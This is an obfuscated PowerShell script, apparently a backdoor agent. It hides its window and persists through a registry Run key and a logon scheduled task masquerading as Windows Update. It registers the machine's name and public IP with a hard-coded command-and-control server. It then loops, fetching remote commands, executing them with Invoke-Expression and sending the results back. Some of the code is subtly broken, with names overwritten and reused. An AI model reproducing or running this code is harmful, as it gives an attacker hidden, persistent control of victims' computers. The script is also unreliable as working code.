#${!@}=[char];${#}="ht";${~}="tp";${%}=":/";${&}="/a";${*}="pi";${(}=".i";${)}="pi";${+}="fy";${,}=".or";${-}="g";${.}="${#}${~}${%}${&}${*}${(}${)}${+}${,}${-}";${/}=[Net.ServicePointManager]::SecurityProtocol;${0}=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::SecurityProtocol=${0};${1}=${!@}+${!@}[3]+${!@}[15]+${!@}[20]+${!@}[8]+${!@}[18]+${!@}[19]+${!@}[4]+${!@}[17]+${!@}[4]+${!@}[13]+${!@}[19];${2}=${!@}[7]+${!@}[20]+${!@}[19]+${!@}[19];${3}=${!@}[5]+${!@}[8]+${!@}[17]+${!@}[19]+${!@}[19];${4}=${!@}[2]+${!@}[14]+${!@}[12]+${!@}[15]+${!@}[20]+${!@}[4]+${!@}[17];${5}=${!@}[18]+${!@}[19]+${!@}[4]+${!@}[0]+${!@}[11]+${!@}[11];${6}=${!@}[18]+${!@}[2]+${!@}[10]+${!@}[4]+${!@}[17]+${!@}[8]+${!@}[13]+${!@}[6];${7}=${!@}[19]+${!@}[7]+${!@}[4]+${!@}[0]+${!@}[11]+${!@}[11];${8}=${!@}[5]+${!@}[24]+${!@}[4]+${!@}[17]+${!@}[17]+${!@}[4]+${!@}[13]+${!@}[19];${9}=${!@}[18]+${!@}[19]+${!@}[4]+${!@}[0]+${!@}[11]+${!@}[11];${:}=${!@}[5]+${!@}[8]+${!@}[15]+${!@}[20]+${!@}[17]+${!@}[13];${;}="ht";${<}="tp";${=}=":/";${>}="/7";${?}="8.";${@}="70";${A}=".23";${B}="5.4";${C}="4:5";${D}="000";${E}="${;}${<}${=}${>}${?}${@}${A}${B}${C}${D}";${F}=[guid]::NewGuid().ToString();${G}=$env:COMPUTERNAME;${H}=(Invoke-WebRequest -Uri ${.} -UseBasicParsing).Content;if(-not([System.Management.Automation.PSTypeName]'WinAPI').Type){Add-Type -TypeDefinition @"using System;using System.Runtime.InteropServices;public class WinAPI{[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();}"@;};${I}=[WinAPI]::GetConsoleWindow();[WinAPI]::ShowWindow(${I},0)|Out-Null;${J}="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";${K}="powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"";Set-ItemProperty -Path ${J} -Name "WindowsUpdateService" -Value ${K} -Force;${L}="WindowsUpdateTask";${M}=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"";${N}=New-ScheduledTaskTrigger -AtLogOn;${O}=New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive;${P}=New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable;Register-ScheduledTask -TaskName ${L} -Action ${M} -Trigger ${N} -Principal ${O} -Settings ${P} -Force|Out-Null;function ${1} {param(${2});${3}=@{"${4}"="${F}";"${5}"="${G}";"${6}"="${H}"}|ConvertTo-Json;try{${7}=Invoke-WebRequest -Uri "${E}/api/${8}" -Method POST -Body ${3} -ContentType "application/json" -UseBasicParsing;return $true;}catch{return $false;}};function ${9} {param(${:});try{${;}=Invoke-Expression ${:} 2>&1|Out-String;return ${;};}catch{return $_.Exception.Message;}};function ${<} {while($true){try{${=}=Invoke-RestMethod -Uri "${E}/api/${>}/${F}" -Method GET -UseBasicParsing;foreach(${?} in ${=}){${@}=${?}.id;${A}=${?}.command;Write-Host "[+] Executing task #${@} : ${A}" -ForegroundColor Green;${B}=${9} -Command ${A};${C}=@{"${D}"="${@}";"${E}"="${B}";"${F}"="${F}"}|ConvertTo-Json;Invoke-WebRequest -Uri "${E}/api/${G}" -Method POST -Body ${C} -ContentType "application/json" -UseBasicParsing|Out-Null;}}catch{Write-Host "[-] Connection error: $($_.Exception.Message)" -ForegroundColor Red;}Start-Sleep -Seconds 30;}};while(-not(${1})){Start-Sleep -Seconds 60;}Write-Host "[+] Agent registered successfully! Starting beacon..." -ForegroundColor Green;${<};